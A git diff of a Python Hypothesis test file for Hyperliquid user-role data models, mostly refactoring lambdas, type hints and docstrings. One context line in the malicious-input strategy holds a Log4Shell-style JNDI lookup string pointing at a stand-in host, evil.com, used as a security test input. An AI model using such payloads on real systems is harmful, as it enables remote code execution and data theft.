@@ -31,13 +31,31 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR USER ROLE MODEL TESTING
 # =============================================================================
 
 
+def _build_hex_address(hex_part: str) -> str:
+    """Build hex address with 0x prefix."""
+    return f"0x{hex_part}"
+
+
+def _build_address_with_prefix(prefix: str, hex_part: str) -> str:
+    """Build address with custom prefix."""
+    return f"{prefix}{hex_part}"
+
+
 def valid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses for user role data."""
+    """Generate valid Ethereum addresses for user role data.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid addresses
         st.sampled_from([
@@ -50,14 +68,18 @@ def valid_ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate invalid Ethereum address strings."""
+    """Generate invalid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Wrong length
         st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
@@ -66,13 +88,13 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
         st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         # Wrong prefix
         st.builds(
-            lambda prefix, hex_part: f"{prefix}{hex_part}",
+            _build_address_with_prefix,
             st.sampled_from(["0X", "1x", "x", "00x", ""]),
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
         # Invalid characters
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(
                 min_size=40,
                 max_size=40,
@@ -88,7 +110,11 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
 
 
 def valid_role_strategy() -> SearchStrategy[str]:
-    """Generate valid user role types."""
+    """Generate valid user role types.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "user",
         "agent",
@@ -99,7 +125,11 @@ def valid_role_strategy() -> SearchStrategy[str]:
 
 
 def invalid_role_strategy() -> SearchStrategy[str]:
-    """Generate invalid user role types."""
+    """Generate invalid user role types.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.just("unknownRole"),
         st.just("admin"),
@@ -116,7 +146,11 @@ def invalid_role_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_role_data_strategy(draw: st.DrawFn) -> dict[str, str | None]:
-    """Generate valid role data dictionaries."""
+    """Generate valid role data dictionaries.
+
+    Returns:
+        dict[str, str | None]: Generated test data.
+    """
     role_type = draw(st.sampled_from(["agent", "subAccount", "empty"]))
 
     if role_type == "agent":
@@ -142,7 +176,11 @@ def valid_role_data_strategy(draw: st.DrawFn) -> dict[str, str | None]:
 
 @st.composite
 def valid_user_role_response_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid user role response data."""
+    """Generate valid user role response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     role = draw(valid_role_strategy())
 
     # Decide whether to include data
@@ -168,8 +206,12 @@ def valid_user_role_response_strategy(draw: st.DrawFn) -> dict[str, Any]:
     return response
 
 
-def malicious_user_role_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for user role security testing."""
+def malicious_user_role_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for user role security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # User role manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-roles}"),
@@ -225,12 +267,12 @@ class TestHyperliquidRawUserRoleDataProperties:
     def test_role_data_validation_success_properties(
         self, role_data: dict[str, str | None]
     ) -> None:
-        """Property: Valid role data should always create valid HyperliquidRawUserRoleData objects."""
+        """Property: Valid role data should create valid HyperliquidRawUserRoleData."""
         # Skip invalid data
         try:
-            for key, value in role_data.items():
+            for value in role_data.values():
                 if value is not None:
-                    assume(isinstance(value, str))
+                    assume(value)  # Assume non-empty
                     assume(len(value) == 42)  # Valid Ethereum address length
                     assume(value.startswith("0x"))
                     assume(all(c in string.hexdigits for c in value[2:]))
@@ -257,9 +299,9 @@ class TestHyperliquidRawUserRoleDataProperties:
         malicious_value=malicious_user_role_strategy(),
     )
     def test_role_data_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Role data model should reject malicious inputs safely."""
+        """Property: Role data model should reject malicious inputs."""
         role_data = {field_name: malicious_value}
 
         # Property: Malicious input should be rejected
@@ -314,9 +356,9 @@ class TestHyperliquidRawUserRoleDataProperties:
         """Property: Role data should be immutable after creation."""
         # Skip invalid data
         try:
-            for key, value in role_data.items():
+            for value in role_data.values():
                 if value is not None:
-                    assume(isinstance(value, str) and len(value) == 42)
+                    assume(len(value) == 42)
                     assume(value.startswith("0x"))
         except (TypeError, IndexError):
             assume(False)
@@ -345,7 +387,7 @@ class TestHyperliquidRawUserRoleResponseProperties:
     def test_user_role_response_validation_success_properties(
         self, response_data: dict[str, Any]
     ) -> None:
-        """Property: Valid user role response data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(response_data["role"], str))
@@ -354,7 +396,7 @@ class TestHyperliquidRawUserRoleResponseProperties:
             if "data" in response_data and response_data["data"] is not None:
                 data = response_data["data"]
                 assume(isinstance(data, dict))
-                for key, value in data.items():
+                for value in data.values():
                     if value is not None:
                         assume(isinstance(value, str) and len(value) == 42)
                         assume(value.startswith("0x"))
@@ -381,10 +423,10 @@ class TestHyperliquidRawUserRoleResponseProperties:
         malicious_value=malicious_user_role_strategy(),
     )
     def test_user_role_response_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: User role response should reject malicious inputs safely."""
-        base_data = {"role": "user"}
+        """Property: User role response should reject malicious inputs."""
+        base_data: dict[str, object] = {"role": "user"}
         if field_name == "data":
             base_data["data"] = malicious_value
         else:
@@ -414,7 +456,7 @@ class TestHyperliquidRawUserRoleResponseProperties:
         ]),
     )
     def test_user_role_response_invalid_data_type_properties(
-        self, valid_role: str, invalid_data_type: Any
+        self, valid_role: str, invalid_data_type: MaliciousInput
     ) -> None:
         """Property: User role response should reject invalid data types."""
         response_data = {"role": valid_role, "data": invalid_data_type}
@@ -512,10 +554,10 @@ class TestHyperliquidRawUserRoleIntegrationProperties:
         malicious_value=malicious_user_role_strategy(),
     )
     def test_user_role_batch_processing_properties(
-        self, responses: list[dict[str, Any]], malicious_value: Any
+        self, responses: list[dict[str, Any]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple user role responses should be processed independently."""
-        valid_responses = []
+        valid_responses: list[HyperliquidRawUserRoleResponse] = []
 
         for response_data in responses:
             # Skip invalid responses
@@ -555,7 +597,7 @@ class TestHyperliquidRawUserRoleIntegrationProperties:
     def test_user_role_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: User role models should safely handle complete adversarial input."""
+        """Property: User role models should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawUserRoleResponse.model_validate(complete_malicious_data)
